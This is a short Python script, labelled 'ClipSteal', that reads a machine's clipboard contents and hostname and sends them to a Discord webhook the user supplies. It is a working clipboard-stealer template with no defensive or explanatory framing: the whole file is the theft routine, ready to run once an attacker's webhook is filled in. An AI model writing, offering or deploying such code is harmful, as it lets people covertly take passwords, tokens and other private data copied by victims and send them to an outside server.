try:
    import pyperclip
    import socket
    from dhooks import Webhook
    hook = Webhook("") # Your Discord webhook here
    hook.modify(name="ClipSteal")
    paste_info = pyperclip.paste()
    user = socket.gethostname()
    if paste_info:
      hook.send(f"Clipboard Contents of {user}: \n```{paste_info}```")
    else:
      hook.send(f"Found no clipboard contents of {user}.")
except ValueError:
    print("Webhook must be provided.")
        

